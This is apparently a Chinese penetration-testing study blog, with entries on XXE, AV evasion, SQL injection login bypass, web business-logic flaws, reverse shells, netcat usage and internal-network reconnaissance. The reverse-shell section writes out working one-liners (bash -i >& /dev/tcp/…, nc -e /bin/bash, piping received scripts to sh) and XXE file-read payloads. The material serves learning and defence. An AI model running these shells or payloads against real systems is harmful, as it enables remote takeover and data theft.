class="line">版权声明：本文为CSDN博主「angry_program」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/angry_program/article/details/104448524/</span><br></pre></td></tr></table></figure>

<p>注意事项：</p>
<p>xml里大小写严格区分；</p>
<p>且只有一个根元素（包含所有其他元素，如students）</p>
<p>黑盒可以通过抓包后查看数据格式类型和Content-Type值(text&#x2F;xml、application&#x2F;xml)判断；</p>
<p>更改Content-Type，查看返回</p>
<h4 id="自定义实体语法"><a href="#自定义实体语法" class="headerlink" title="自定义实体语法"></a><strong>自定义实体语法</strong></h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素[</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY 实体名 <span class="string">&quot;实体内容&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line"></span><br><span class="line">引用已定义的实体：</span><br><span class="line"></span><br><span class="line">　　　　&amp;实体名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① 内部申明格式</span><br><span class="line">&lt;!DOCTYPE 根元素 [元素申明]&gt;</span><br><span class="line">DTD例子:  &lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">XML例子:  &lt;author&gt;&amp;writer;&lt;/author&gt;</span><br><span class="line">注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">② 外部引用DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD的URI&quot;&gt;</span><br><span class="line">DTD例子:  &lt;!ENTITY writer SYSTEM &quot;http://www.***.com/dtd/entities.dtd&quot;&gt;</span><br><span class="line">XML例子:  &lt;author&gt;&amp;writer;&lt;/author&gt;</span><br><span class="line"> </span><br><span class="line">③ 引用公共DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD标识名&quot; &quot;公共DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>



<h5 id="读文件内容"><a href="#读文件内容" class="headerlink" title="读文件内容"></a>读文件内容</h5><h6 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version =&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line"> </span><br><span class="line"> ]&gt;</span><br><span class="line"></span><br><span class="line"> &lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>这是一种外部实体应用方法</p>
<h6 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h6><p>。。。</p>
<h5 id="内网探针或攻击内网应用-触发漏洞地址"><a href="#内网探针或攻击内网应用-触发漏洞地址" class="headerlink" title="内网探针或攻击内网应用(触发漏洞地址)"></a>内网探针或攻击内网应用(触发漏洞地址)</h5><h5 id="RCE执行"><a href="#RCE执行" class="headerlink" title="RCE执行"></a>RCE执行</h5><p>安装了expect扩展的php环境里执行系统命令</p>
<h5 id="引入外部实体dtd"><a href="#引入外部实体dtd" class="headerlink" title="引入外部实体dtd"></a>引入外部实体dtd</h5>]]></content>
      <categories>
        <category>xxe</category>
        <category>xml</category>
      </categories>
      <tags>
        <tag>xxe</tag>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀操作</title>
    <url>/2023/07/01/%E5%85%8D%E6%9D%80%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>利用cobalt strike可以生成后门exe文件，但是容易被杀毒软件查杀。</p>
<h2 id="常见免杀方式"><a href="#常见免杀方式" class="headerlink" title="常见免杀方式"></a>常见免杀方式</h2><blockquote>
<p>修改特征码</p>
<p>花指令免杀</p>
<p>加壳免杀</p>
<p>内存免杀</p>
<p>二次编译</p>
<p>分离免杀</p>
<p>资源修改</p>
</blockquote>
]]></content>
      <categories>
        <category>文件免杀</category>
      </categories>
      <tags>
        <tag>文件免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>业务流程</title>
    <url>/2023/06/11/%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="一、基本业务"><a href="#一、基本业务" class="headerlink" title="一、基本业务"></a>一、基本业务</h1><h2 id="1-用户注册"><a href="#1-用户注册" class="headerlink" title="1.用户注册"></a>1.用户注册</h2><p>​	隐患及解决方式：</p>
<blockquote>
<p>1.用户重复注册；利用token机制</p>
<p>2.不校验用户注册数据（比如，注册时，admin与admin空格；数据库会认为同一个用户）；后台用过滤函数即可。</p>
<p>3.频繁的用户批量注册：</p>
<p>​	1.对相同用户信息注册频率限制：</p>
<p>​		单IP注册频率限制、表单加验证码、需要姓名加身份证认证</p>
<p>​	2.采用二次身份校验技术</p>
<p>​		需要验证用户邮箱、手机绑定验证</p>
</blockquote>
<p>但是，所有的限制手段的目的均为提升批量注册的难度，但无法从根本上阻止恶意用户，因为系统无法识别用户注册的真实意图。因此从防御视角来看，应尽可能提高恶意注册的难度，使批量注册的成本高于从网站获取到的利益，这样为解决此问题的唯一思路。</p>
<h2 id="2-用户登录"><a href="#2-用户登录" class="headerlink" title="2.用户登录"></a>2.用户登录</h2><p>1.用户名常见、密码太简单（弱口令爆破）：</p>
<p>​	1）限制用户名&#x2F;密码验证速率。</p>
<p>​	2）连续三次输入错误后采用验证码等手段进行限制。</p>
<p>​	3）提升用户密码强度及位数（较难执行，用户不遵守的情况较多）。</p>
<p>​	4）定期修改密码（在实践中基本上无法做到，仅适用于极个别企业内网系统）。</p>
<p>2.sql注入的万能密码</p>
<p>​	关键是构造使用or的数据库查询语句，并添加恒等式，实现数据库对用户输入的密码查询结果永远正确。</p>
<p>比如输入</p>
<p><code>&#39; or &#39;1&#39;=&#39;1</code></p>
<p>后台处理为：</p>
<p><code>select * from user where name= &#39;admin&#39; and passwd= &#39;&#39; or &#39;1&#39;=&#39;1&#39;；</code></p>
<p>然后还有用户名注释嘞，<code>admin&#39; -- s 密码随意</code></p>
<p>后台处理为：<code>select * from user where name= &#39;admin&#39;</code> – s and …</p>
<p>预防的话：</p>
<blockquote>
<p>限制用户名及密码可使用字符，不符合要求的直接过滤，避免单引号、数据库注释符等SQL注入行为发生。</p>
<p>在PHP+MySQL环境下，推荐采用mysql_real_escape_string（）函数实现对输入数据的过滤，mysql_real_escape_string（）函数转义SQL语句中使用的字符串中的特殊字符。</p>
<p>开启此功能后，下列字符受影响：\x00、\n、\r、\、’、”、\x1a。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618142621477.png"></p>
<p>用户Session校验</p>
<h2 id="3-密码找回"><a href="#3-密码找回" class="headerlink" title="3.密码找回"></a>3.密码找回</h2><p>验证步骤可跳过</p>
<p>平行越权</p>
<p>弱token</p>
<p>Session覆盖</p>
<h2 id="4-用户越权"><a href="#4-用户越权" class="headerlink" title="4.用户越权"></a>4.用户越权</h2><p>​	RBAC模型（基于角色的访问控制）</p>
<p>主要是Web系统能定制各类业务，能快速实现各类不同应用场景及功能。不好总结。</p>
<h1 id="二、标准业务"><a href="#二、标准业务" class="headerlink" title="二、标准业务"></a>二、标准业务</h1><p>一台物理服务器、一个互联网接口、一个固定IP及域名就可以构建一个基本的Web网站。</p>
<p>也可利用目前各类云服务器（如阿里云）并配合相应的CMS，就可在半小时内快速建站，网站的速度及美观性均可满足用户基本需求，而且提供完备的站点管理措施及内容更新方式。</p>
<h2 id="系统管理者面临的问题"><a href="#系统管理者面临的问题" class="headerlink" title="系统管理者面临的问题"></a>系统管理者面临的问题</h2><p>1.如何建设</p>
<blockquote>
<p>开发人员根据Web功能需求开发网站。这样涉及的问题会非常多，目前也有非常成熟的开发体系及防护方案。</p>
</blockquote>
<blockquote>
<p>中小站长由于时间及技术实力的问题，通常会选择各类CMS架设网站。</p>
</blockquote>
<p>2.如何管理</p>
<blockquote>
<p>远程登录服务器，在操作系统层面实现本地对文件的修改。</p>
<p>远程登录数据库，直接管理数据库等。</p>
<p>建设管理后台，实现对网站的应用层面管理等。</p>
</blockquote>
<p>3.用户怎么用</p>
<blockquote>
<p>网站交互功能越多，面临的安全风险就越高，这点毋庸置疑。一个静态网站无论如何也不会出现各类安全漏洞。这里不包含伪静态网站，伪静态网站只是将参数转换为路径（如？a&#x3D;1转换为&#x2F;a&#x2F;1），这在攻击者看来没有什么难度。</p>
</blockquote>
<blockquote>
<p>攻击者使用的范围并不会比正常用户广。因此，攻击者会从各项应用点进行考虑并分析，寻找安全隐患，如Web传参点等。</p>
</blockquote>
<h2 id="CMS及其特征"><a href="#CMS及其特征" class="headerlink" title="CMS及其特征"></a>CMS及其特征</h2><p>CMS（Content Management System）即内容管理系统，通常指一套完整的网站模板或建站系统。</p>
<p>CMS已设计好一套标准的使用环境，包括完整的前后台逻辑等。用户只需要将CMS部署在Web服务器上，添加相应内容、修改站点样式即可完成网站的制作。国内目前大量的论坛及个人博客均采用CMS进行架设。</p>
<blockquote>
<p>Discuz 、Ecshop、phpcms等</p>
</blockquote>
<p>从安全角度考虑，CMS的安全问题主要有：</p>
<p>1）整个网站系统依托于CMS，如果CMS突然爆发高危漏洞，则站点会受到影响。</p>
<p>2）CMS默认会在根目录中有setup页面。很多网站管理员在CMS安装完毕后如不及时删除它，则很容易留下被覆盖攻击的隐患。</p>
<p><strong>CMS比较适合运维人员少或无专职运维人员的个人及中小型企业者</strong></p>
<p>利用CMS建站时，建议采取以下手段，可有效保障Web系统的安全。</p>
<p>1）及时升级CMS系统版本，保证版本最新。</p>
<p>2）尽可能少利用CMS的扩展插件，尤其是WordPress。</p>
<p>3）上线完毕后删除默认安装脚本。</p>
<p>4）务必修改默认密码、CMS标识等。</p>
<p>CMS系统无论怎么修改，其中一些特征依然可被攻击者轻易识别，之后再利用目标CMS版本对应的漏洞进行攻击尝试。利用搜索引擎进行搜索即可发现大量此类内容，点击进入之后可看到相关的标识：以discuz！为例，它常用于各类站点首页的标识。不过，部分管理员会对其进行修改。</p>
<blockquote>
<p>powered by Discuz! X3.2 技术支持。。。。</p>
</blockquote>
<p>还有，源代码也可能有这种信息。</p>
<p>当然了，目标站点的CMS及对应版本号这些基本信息，可能低危漏洞都算不上，但对于攻击者来说，是个考虑是继续渗透还是放弃的信息。</p>
<h2 id="常见远程管理方式"><a href="#常见远程管理方式" class="headerlink" title="常见远程管理方式"></a>常见远程管理方式</h2><h3 id="Windows远程登录"><a href="#Windows远程登录" class="headerlink" title="Windows远程登录"></a>Windows远程登录</h3><p>RDP协议（Remote Desktop Protocol，远程桌面协议）可使Windows系统之间进行互相的远程访问，默认利用3389端口。</p>
<p>它虽不存在什么漏洞，但攻击者可能利用其他方式对现有系统提权后并创建账号，再直接利用新创建账号远程登录即可。</p>
<h3 id="Linux-SSH22端口"><a href="#Linux-SSH22端口" class="headerlink" title="Linux SSH22端口"></a>Linux SSH22端口</h3><p><strong>（Windows使用putty进行SSH登录）</strong></p>
<p>命令嘛，工具也可以。</p>
<p>ssh ...@… </p>
<p>攻击者攻击Web应用的主要原因是想获得Web应用所在服务器的权限，进而作为跳板攻击内网。当攻击者获得webshell后，接下来就会进行提权并开放远程管理权限。因此，远程管理很多时候方便运维人员开展，但在一定程度上也为攻击者提供了远程连接的通道。</p>
<h3 id="Web应用管理后台"><a href="#Web应用管理后台" class="headerlink" title="Web应用管理后台"></a>Web应用管理后台</h3><p>注意不要在前台放后台管理链接，</p>
<p>否则</p>
<blockquote>
<p>在前台可利用SQL注入、XSS盲打等手段获取后台用户的登录凭证</p>
</blockquote>
<p>也避免被路径扫描到后台路径，Web应用管理后台起得复杂一点。</p>
<p>针对后台管理业务的安全，重点在于登录用户管理阶段，如管理员登录、密码找回，越权等。</p>
<h3 id="数据库开放远程管理"><a href="#数据库开放远程管理" class="headerlink" title="数据库开放远程管理"></a>数据库开放远程管理</h3><p>在正常网站运行时，数据库只需与Web服务器进行通信。如果站（网站）库（数据库）为一体部署，那么在本地通信即可。但在真实环境中，MySQL默认数据库远程管理处于关闭状态，考虑到维护的方便，部分系统均会考虑打开远程数据库接口。管理员可利用各类数据库管理工具实现远程登录。</p>
<p>启用远程管理的安全隐患包括：</p>
<p>1）如果存在弱密码，则直接可能被攻击者登录并获取数据。</p>
<p>2）可远程爆破MySQL密码。</p>
<p>3）如果攻击者已获得webshell，则会在页面中寻找数据库连接密码，再进行远程连接。</p>
<p>以上任何一种隐患可能均会对数据库安全造成极大影响，因此建议<strong>关闭数据对外连接端口</strong>。如需远程维护，考虑利用VPN等先连接到内网再进行访问。</p>
<h3 id="在线编辑器"><a href="#在线编辑器" class="headerlink" title="在线编辑器"></a>在线编辑器</h3><p>如果有上传文件功能，那就存在文件上传漏洞。</p>
<p>以fckeditor为例，可将编辑器结合在网页中，实现功能强大的上传点。</p>
<p>目前此类问题主要存在于大量已运行多年的Web应用系统中，新建系统基本不存在此类问题。</p>
<h2 id="可能的漏洞点："><a href="#可能的漏洞点：" class="headerlink" title="可能的漏洞点："></a>可能的漏洞点：</h2><blockquote>
<p>是否有搜索框能否注入或XSS</p>
<p>是否有留言框能否XSS打cookie</p>
<p>有登录尝试登录框是否有sql注入或XSS</p>
<p>是否有验证码<br>验证码能否被识别<br>验证码能否被无视</p>
<p>注册是否有sql漏洞</p>
<p>是否能注册管理权限的账号</p>
<p>验证手机的情况下<br>是否能无限轰炸<br>是否能任意更改<br>验证码是否有时间验证<br>验证码是否相同<br>是否能爆破验证码</p>
<p>登录是否能越权<br>未授权访问<br>SQL注册测试</p>
<p>个人信息是否有存储型XSS</p>
<p>个人信息能否CSRF<br>有验证机制能否绕过</p>
<p>个人信息是否存在越权<br>改变uid等敏感参数检测是否越权<br>平行越权<br>垂直越权</p>
<p>头像上传是否能getshell<br>直接getshell<br>解析漏洞<br>上传漏洞<br>是否能上传txt</p>
<p>修改密码能否CSRF<br>有验证机制能否绕过</p>
<p>找回密码是手机号码验证<br>是否能无限轰炸<br>是否能任意更改<br>验证码是否有时间验证<br>验证码是否相同<br>是否能爆破验证码</p>
<p>是否有购买商品功能<br>任意修改支付金额<br>任意修改商品数量<br>收货地址存储型XSS</p>
<p>配置检查</p>
<p>API接口安全</p>
<p>逻辑错误漏洞</p>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>可能<a href="http://t.csdn.cn/kZru3">CSDN思源湖的鱼</a></p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>业务流程</category>
        <category>业务漏洞点</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>业务流程</tag>
        <tag>业务漏洞点</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件介绍</title>
    <url>/2023/06/01/%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h1><p>介于操作系统和应用软件之间，为应用软件提供服务功能的软件，有消息中间件，交易中间件，应用服务器等。由于介于两种软件之间，所以，称为中间件</p>
<h1 id="2-常见中间件"><a href="#2-常见中间件" class="headerlink" title="2.常见中间件"></a>2.常见中间件</h1><h2 id="1-Tomcat"><a href="#1-Tomcat" class="headerlink" title="1.Tomcat"></a>1.Tomcat</h2><p>包括<strong>站点、连接器、应用上下文、资源</strong>四个部分。</p>
<ol>
<li><h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3></li>
</ol>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/2023/05/31/%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<h2 id="1-参考文章"><a href="#1-参考文章" class="headerlink" title="1.参考文章"></a>1.参考文章</h2><p>版权声明：本文为CSDN博主「云淡.风轻」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45584159/article/details/111489653">https://blog.csdn.net/qq_45584159/article/details/111489653</a></p>
<h2 id="2-shell"><a href="#2-shell" class="headerlink" title="2.shell"></a>2.shell</h2><p>shell就是实现用户命令的接口，通过该接口我们能实现对计算机的控制(root权限)， 而反弹shell就是将shell反弹给攻击者，从而达到让攻击者可以在自己的机器上执行shell命令， 从而操控受害者的计算机。</p>
<h2 id="3-为什么要反弹shell"><a href="#3-为什么要反弹shell" class="headerlink" title="3.为什么要反弹shell"></a>3.为什么要反弹shell</h2><p>攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
<p>以下情况无法正向连接：</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
<p>2.它的ip会动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p> 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<h2 id="3-反弹前提"><a href="#3-反弹前提" class="headerlink" title="3.反弹前提"></a>3.反弹前提</h2><p>第一步：要有一个可以被监听的端口，通常使用nc命令。<br>eg：nc -lvp 6767</p>
<p>解析：-l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
<p>第二步：要产生一个交互式的shell，使用bash -i</p>
<p>解析：bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别， -i 这个参数表示的是产生交互式的shell</p>
<p>第三步：我们为什么要监听一个端口，就是因为存在一个特殊设备文件(&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;root)，如果你在任何一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器(即攻击者(攻击者作为服务器，而受害者作为客户端，反弹shell就是让受害者主动与服务端-攻击者建立通信))的socket通信。</p>
<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
<p>&#x2F;dev&#x2F;tcp|udp&#x2F;ip&#x2F;port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p>
<h2 id="4-重定向"><a href="#4-重定向" class="headerlink" title="4.重定向"></a>4.重定向</h2><p>有时候需要让文件内容输出到其他设备。</p>
<p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p>
<p>重定向就是针对文件描述符的操作</p>
<h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</p>
<p>bash -i 产生一个bash交互环境</p>
<p>&gt;&amp; 将联合符号前面的内容与后面结合然后一起重定向给后者</p>
<p>&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 主机与目标机建立一个TCP连接</p>
<p>0&gt;&amp;1 标准的输入与标准输出一起重定向给标准输出的内容</p>
<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p>nc -lvnp 6666</p>
<h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3>]]></content>
      <categories>
        <category>反弹shell</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透</title>
    <url>/2023/07/03/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h1 id="1-内网信息收集"><a href="#1-内网信息收集" class="headerlink" title="1.内网信息收集"></a>1.内网信息收集</h1><p>当我们渗透进内网环境后，对网络拓扑一无所知，测试人员应先对当前网络环境做出判断。对当前机器角色分析，对机器所处网络环境拓扑结构分析，对机器所处区域分析。</p>
<p>当前机器角色分析：</p>
<blockquote>
<p>判断当前主机是web服务器&#x2F;开发测试服务器&#x2F;公共服务器&#x2F;文件服务器&#x2F;代理服务器&#x2F;dns服务器&#x2F;还是存储服务器等。具体判断过程可根据主机名，文件，网络链接情况综合完成。</p>
</blockquote>
<p>对机器所出网络环境分析：</p>
<blockquote>
<p>是指对所处内网进行全面数据收集和分析整理，绘制出大致的内网整体结构拓扑。</p>
</blockquote>
<p>对机器所处区域分析：</p>
<blockquote>
<p>判断机器所处于网络拓扑哪个区域，是在dmz&#x2F;办公区&#x2F;还是核心区&#x2F;区域并不是绝对的，所以区域界限也是相对的。</p>
</blockquote>
<h2 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h2><p>操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，那么操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的。</p>
<blockquote>
<p>ipconfig &#x2F;all</p>
<p>systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version” 查询操作系统和版本信息 英文系统</p>
<p>systeminfo | findstr &#x2F;B &#x2F;C:”OS 名称” &#x2F;C:”OS 版本” 查询操作系统和版本信息 中文系统</p>
<p>echo %PROCESSOR_ARCHITECTURE% 查看系统体系结构</p>
<p>wmic prouct get name, version 查看安装的软件的版本、路径等</p>
<p>powershell “Get-WmiObject -class Win32_Product |Select-Object -Property name, version” PowerShell收集软件的版本信息</p>
<p>tasklist 查看当前进程列表和进程用户</p>
<p>netstat -ano 查询端口</p>
<p>systeminfo 查看系统详情</p>
<p>net share 查看本机共享列表和可访问的域共享列表</p>
<p>wmic share get name,path,status 查找共享列表</p>
</blockquote>
<h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><h3 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h3><p>域模式下，至少有一台服务器负责每一台连入网络的电脑和用户的验证工作。</p>
<blockquote>
<p>whoami 查看当前权限</p>
<p>whoami &#x2F;all 获取SID</p>
<p>net user xxx &#x2F;domain 查询指定用户的详情信息</p>
<p>判断是否存在域:</p>
<p>ipcondig &#x2F;all 可查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处在同一网段等… 然后，通过反向解析查询命令nslookup来解析域名的IP地址，用解析到的IP地址进行对比，判断域控服务器和DNS服务器是否在同一台机器上。</p>
<p>systeminfo 对比查看”域(域名)”和”登录服务器(域控制器)”的信息是否互相匹配。</p>
<p>net config workstation 对比查看”工作站域DNS名称(域名)”和”登录域()域控制器”的信息是否相匹配。</p>
<p>net time &#x2F;domain 判断主域。</p>
<p>net view &#x2F;domain 查询域</p>
<p>net view &#x2F;domain:HACHE 查询域内的所有计算机</p>
<p>net group &#x2F;domain 查询域内的所有计算机</p>
<p>net group “domain computers” &#x2F;domain 查询所有域成员计算机列表</p>
<p>net accounts &#x2F;domain 获取域密码信息</p>
<p>nltest &#x2F;domain_trusts 获取域信任信息</p>
</blockquote>
<p>域内端口扫描</p>
<h2 id="powershell收集信息"><a href="#powershell收集信息" class="headerlink" title="powershell收集信息"></a>powershell收集信息</h2><p>msf调用powershell</p>
<p>powersploit工具</p>
<h1 id="2-内网代理穿透"><a href="#2-内网代理穿透" class="headerlink" title="2.内网代理穿透"></a>2.内网代理穿透</h1><h2 id="a-Nc使用"><a href="#a-Nc使用" class="headerlink" title="a.Nc使用"></a>a.Nc使用</h2><p>靶场的时候会用到nc -lvnp 1234</p>
<blockquote>
<p>l开启监听，v显示详细输出，n不DNS反向查询ip域名，p指定端口</p>
<p>e 指定对应的应用程序</p>
</blockquote>
<p>nc可以作为server端，启动一个tcp的监听。</p>
<p>一般是搭配反弹bash，</p>
<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机ip&#x2F;4444 0&gt;&amp;1</p>
<p>在nc监听端口处得到一个shell，此时对该shell的操作，相当于对远程shell的操作。</p>
<h3 id="场景1-正向shell"><a href="#场景1-正向shell" class="headerlink" title="场景1 正向shell"></a>场景1 正向shell</h3><p><strong>攻击机位于局域网，靶机位于公网</strong></p>
<p>靶机监听端口</p>
<p><code>nc -lvp 8888 -e /bin/bash</code></p>
<p>攻击机发出连接</p>
<p><code>nc -v 靶机ip 8888</code></p>
<p>连接成功后，攻击机可输入whoami，显示靶机信息</p>
<p>攻击机生成pty shell的话</p>
<p><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>获得靶机终端。</p>
<h3 id="场景2-反向shell"><a href="#场景2-反向shell" class="headerlink" title="场景2 反向shell"></a>场景2 反向shell</h3><p>攻击机在公网，靶机在内网</p>
<p>攻击机将shell绑定到本地端口，供靶机来访问，攻击机进行监听。</p>
<p>攻击机监听端口</p>
<p><code>nc -lvp 8888</code></p>
<p>靶机连接</p>
<p><code>nc -v 攻击机ip -e /bin/bash</code></p>
<p>pty python</p>
<h3 id="场景3-文件传输"><a href="#场景3-文件传输" class="headerlink" title="场景3 文件传输"></a>场景3 文件传输</h3><p>攻击机局域网，靶机公网</p>
<p>攻击机传输1.sh 脚本文件到靶机</p>
<p>靶机监听端口，并将输出重定向到文件1.sh</p>
<p><code>nc --recv-only -lvp 8888 &gt; 1.sh</code></p>
<p>攻击机连接靶机端口，输入重定向到文件1.sh</p>
<p><code>nc -v --send-only 靶机ip 8888 &lt; 1.sh</code></p>
<blockquote>
<p>当然了，靶机接收文件的时候，是可以通过管道将脚本内容直接传入shell,这样的话，不会在硬盘中留下文件。</p>
<p><code>nc --recv-only -lvp 8888 |sh</code></p>
</blockquote>
<h3 id="场景4-文件下载"><a href="#场景4-文件下载" class="headerlink" title="场景4 文件下载"></a>场景4 文件下载</h3><p>靶机的1.sh下载到攻击机</p>
<p>靶机监听端口，输入重定向到文件1.sh</p>
<p><code>nc --send-only -lvp 8888 &lt; 1.sh</code></p>
<p>攻击机连接靶机端口，输出重定向到文件1_download.sh</p>
<p><code>nc -v --recv-only 靶机ip 8888 &gt; 1_download.sh</code></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://b23.tv/JfDO0uq">【渗透常用命令之nc &#x2F;&#x2F; netcat &#x2F;&#x2F; ncat &#x2F;&#x2F; kali &#x2F;&#x2F;黑客-哔哩哔哩】</a></p>
<h2 id="b-工具使用-暂略"><a href="#b-工具使用-暂略" class="headerlink" title="b.工具使用(暂略)"></a>b.工具使用(暂略)</h2><h1 id="3-内网横向渗透"><a href="#3-内网横向渗透" class="headerlink" title="3.内网横向渗透"></a>3.内网横向渗透</h1><h2 id="流量监听工具"><a href="#流量监听工具" class="headerlink" title="流量监听工具"></a>流量监听工具</h2><p>wireshark、cain</p>
<p>监听一些未加密的服务协议内容（服务连接密码，网站登录密码，敏感数据）</p>
<h2 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h2><p>工具：netfuck、foca evail</p>
<p>主要功能：</p>
<blockquote>
<p>域名欺骗</p>
<p>网页内容欺骗</p>
<p>Dns解析欺骗</p>
<p>解析欺骗+钓鱼攻击</p>
</blockquote>
<p>ettercap工具的中间人攻击</p>
<h2 id="服务密码攻击"><a href="#服务密码攻击" class="headerlink" title="服务密码攻击"></a>服务密码攻击</h2><p>字典爆破</p>
<p>ftp、3389、ssh</p>
<h2 id="shell控制连接"><a href="#shell控制连接" class="headerlink" title="shell控制连接"></a>shell控制连接</h2><h1 id="4-域网络渗透"><a href="#4-域网络渗透" class="headerlink" title="4.域网络渗透"></a>4.域网络渗透</h1><h2 id="1-Kerbers协议"><a href="#1-Kerbers协议" class="headerlink" title="1.Kerbers协议"></a>1.Kerbers协议</h2><p>计算机网络认证协议 ，其设计目标是通过密钥系统为网络中通信的<code>客户机</code>(Client)&#x2F;<code>服务器</code>(Server)应用程序提供严格的身份验证服务，确保通信双方身份的真实性和安全性。</p>
<p>侧重在于认证通信双方的身份。</p>
<blockquote>
<p>DS (domain server),有资料为KDC（密钥分发中心），存储了每个域用户的口令散列值NTLM。</p>
<p>根据功能划分，DC包含两个模块，AS,TGS：</p>
<p>AS(AUTHENTICATION SERVER)，认证用户服务器，专门用来认证客户端的身份并<strong>发放</strong>客户用于访问TGS的<strong>TGT</strong>(票据授予票据)</p>
<p>TGS(Ticket Granting Service），票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据(ticket)</p>
<p>TGT(ticket-granting ticket)，用于获取ticket的票据</p>
<p>NTLM（NT LAN MANAGER）是一种网络认证协议，它是基于挑战（Challenge）&#x2F;响应（Response）认证机制的一种认证模式。</p>
<p>NTLM使用在Windows NT和Windows 2000 Server（or later）工作组环境中（kerberos用在域模式下）。</p>
<p>在AD域环境中，如果需要认证Windows NT系统，也必须采用NTLM。</p>
</blockquote>
<h3 id="Kerbers协议流程"><a href="#Kerbers协议流程" class="headerlink" title="Kerbers协议流程"></a>Kerbers协议流程</h3><p>三步，</p>
